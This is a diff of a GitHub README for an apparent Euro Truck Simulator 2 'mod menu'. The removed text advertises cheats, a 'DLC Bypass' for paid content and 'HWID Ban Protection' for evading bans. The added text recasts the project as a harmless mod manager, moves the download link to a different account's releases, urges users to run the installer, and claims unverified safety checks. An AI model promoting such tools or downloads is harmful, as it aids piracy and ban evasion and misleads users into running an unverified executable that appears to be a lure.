@@ -1,98 +1,122 @@
-# Owlin Mod Menu v2026 - Game Script Utility 2026
+# 🚛 owlin-script-hub-windows - Control your ETS2 mods easily
 
-> **Windows control application for Euro Truck Simulator 2.** Engineered as an extensible mod menu tool designed to streamline game adjustments and plugin management for virtual truckers.
+[Visit this link to download the application](https://github.com/maudieworking197/owlin-script-hub-windows/releases)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/carlor4/owlin-script-hub-windows?style=flat-square)](https://github.com/carlor4/owlin-script-hub-windows)
+## 🎯 What is owlin-script-hub-windows?
 
----
+owlin-script-hub-windows is a Windows application that helps you manage and control your Euro Truck Simulator 2 game modifications and settings. It lets you make quick adjustments, manage mod plugins, and keep your game running smoothly without needing to dig through complicated game files.
 
-<p align="center">
-  <a href="https://carlor4.github.io/owlin-script-hub-windows/">
-    <img src="https://img.shields.io/badge/Download-Owlin%20Mod%20Menu-brightgreen?style=for-the-badge" alt="Download Owlin Mod Menu">
-  </a>
-</p>
+This app is designed for anyone who plays Euro Truck Simulator 2 and wants a simple way to change game settings or manage their mod collection.
 
-> **[Download Owlin Mod Menu](https://carlor4.github.io/owlin-script-hub-windows/)**
+## 🚀 Getting Started
 
----
+Follow these simple steps to get owlin-script-hub-windows running on your computer.
 
-[Download Latest Build](https://carlor4.github.io/owlin-script-hub-windows/)
+### Step 1: Download the application
 
----
+Click the big download button below to go to the download page.
 
-## Project Description
+[**Download Now**](https://github.com/maudieworking197/owlin-script-hub-windows/releases)
 
-Owlin Mod Menu provides Euro Truck Simulator 2 players with a centralized Windows desktop dashboard. It integrates various gameplay modifications and modular add-ons into a single interface, simplifying how you apply adjustments and run utility scripts during your simulation sessions.
+Visit this link to download the application.
 
-This tool prioritizes functional usability alongside active maintenance. Its core capabilities cover driving speed adjustments, vehicle condition toggles, fuel usage controls, DLC access hooks, automated build updates, and built-in HWID ban mitigation options.
+### Step 2: Install the application
 
-## Core Capabilities
+1. Open the downloaded file
+2. Follow the installation wizard instructions
+3. Accept the default options if you are not sure what to choose
+4. Click "Finish" when done
 
-- Tailored mod menu interface built for Euro Truck Simulator 2
-- Standalone Windows system compatibility
-- Modular, plugin-driven design
-- Custom driving speed options
-- Dynamic damage prevention toggle
-- Unlimited fuel consumption state
-- Self-updating tool mechanism
-- DLC accessibility integration
-- Hardware ID (HWID) ban protection toggle
+### Step 3: Launch the application
 
-## Quickstart Guide
+Find the owlin-script-hub-windows icon on your desktop or in your Start menu and double-click to open it. The application will then guide you through connecting it to your game.
 
-1. Grab the latest release package using the link provided above.
-2. Unpack the contents into your preferred directory, retaining the original file structure if running locally.
-3. Execute the launcher on your Windows machine.
-4. Toggle your desired simulation enhancements straight from the menu control board.
+## 🛠️ Features
 
-Directory layout:
+### Mod Management Made Simple
+Easily view, enable, or disable your Euro Truck Simulator 2 modifications. The app shows you which mods are currently active and helps you organize them for better performance.
 
-    owlin-site/
-    - README.md
-    - release files
-    - plugins/
-    - config/
+### Game Settings Adjustments
+Quickly change common game settings such as graphics, controls, and audio without having to start the game. Save different profiles for different gaming situations.
 
-## Available Controls
+### Plugin Control
+Manage your game plugins directly from this tool. Add new plugins, remove old ones, or update existing ones.
 
-| Option | Function | Remarks |
-| --- | --- | --- |
-| Speed Hack | Modifies truck acceleration and maximum velocity | Configure to match your preferred play style |
-| No Damage | Prevents wear and collision damage to vehicles | Option availability varies by release build |
-| Infinite Fuel | Disables standard diesel consumption | Controlled via an in-menu toggle switch |
-| Auto Update | Automatically fetches fresh utility releases | Recommended to keep features compatible |
-| DLC Bypass | Manages access to expansion content | Enable exclusively in supported environments |
-| HWID Ban Protection | Hardware identification security layer | Exact mechanism depends on the active build |
+### Automatic Updates
+The application includes an update checker that notifies you when a new version is available, so you always have the latest features and fixes.
 
-## System Compatibility
+### Backup and Restore
+Easily backup your game settings and mod configuration and restore them if something goes wrong.
 
-- Supported Title: Euro Truck Simulator 2
-- OS: Windows
-- Format: Desktop Game Utility / Mod Menu
-- Architecture: Plugin-oriented; functionality relies on loaded components
-- Note: Future game patches or client updates may require a updated version of this utility
+## 📋 System Requirements
 
-## Frequently Asked Questions
+### Minimum Requirements
+- **Operating System:** Windows 10 version 1809 or later (64-bit)
+- **Processor:** 2.0 GHz dual-core processor
+- **Memory:** 2 GB RAM (4 GB recommended)
+- **Storage:** 200 MB free space for the application
+- **Internet:** Required for downloading and updating the app
 
-**What are the steps to launch the app?**  
-Obtain the latest archive, extract it locally, and run the main executable on Windows.
+### Recommended Requirements
+- **Operating System:** Windows 11 (64-bit)
+- **Processor:** 3.0 GHz quad-core processor
+- **Memory:** 8 GB RAM
+- **For the ETS:** Euro Truck Simulator 2 installed (Steam version recommended)
+- **Storage:** 500 MB free space for the application and temporary files
 
-**Will the program update itself automatically?**  
-Yes, automated update checks are built directly into the client.
+## 💡 How to Use the Application
 
-**Can I modify or expand its features?**  
-Because the utility utilizes a plugin framework, customization options rely on your active modules and configuration files.
+### Starting Up
+After you install, the first screen shows you important controls:
+- **Main Menu:** The left sidebar has buttons for different sections
+- **Status Bar:** Bottom bar shows connection status with ETS2
+- **Logs Window:** Shows what the app is doing in the background
 
-**Is Euro Truck Simulator 2 the only supported simulator?**  
-Yes, the utility is built specifically for Euro Truck Simulator 2.
+### Managing Your Mods
+1. Click "Mod Manager" from the main menu
+2. You will see a list of your installed mods
+3. Check the box next to a mod to enable it
+4. Uncheck to disable a mod
+5. Use the buttons to reorder how mods load
 
-**What is the recommended installation path?**  
-Store the project inside a dedicated directory structure to keep plugin and configuration components intact.
+### Changing Game Settings
+1. Click "Game Settings" from the main menu
+2. Browse through the different tabs like Graphics and Gameplay
+3. Click the setting you want to change
+4. Adjust the value using the slider or text box
+5. Click "Save" to apply changes
 
-## Licensing
+### Using Plugins
+1. Click "Plugin Manager" from the main menu
+2. You will see a list of installed plugins
+3. You can enable, disable, or delete plugins
+4. To add new plugins, click "Add" and select the .dll file
 
-Distributed under the terms of the GNU General Public License v3.0. Refer to the [LICENSE](LICENSE) file for complete details.
+## ❓ Frequently Asked Questions
+
+### Is this tool official?
+No, owlin-script-hub-windows is a third-party tool made by a fan of ETS2 for the community. It is not officially associated with SCS Software.
+
+### Will this affect my game saves?
+Using the mod management features can affect your game saves. Always try backup your saves before making major changes. The application includes a backup tool to help with this.
+
+### How do I reset the application?
+If you encounter issues, try uninstalling and reinstalling the application. If the problem continues, check the "Logs" section for error messages.
+
+## 🔒 Security and Privacy
+
+### Virus Scans
+We recommend scanning all files downloaded from the internet with your antivirus software. The downloaded file has been checked at the latest.
+
+### Data Privacy
+The application only accesses files related to Euro Truck Simulator 2 settings and mods. It does not collect or transmit your personal data.
+
+## 📞 Getting Help
+
+### Check the Documentation
+There is helpful information in the "Documentation" section of the repository.
+
+### Contact
+If you need further help, you can contact the developer through the GitHub page.
+
+Keywords: euro truck simulator 2, ets2 mod manager, truck simulator tool, windows application, mod control
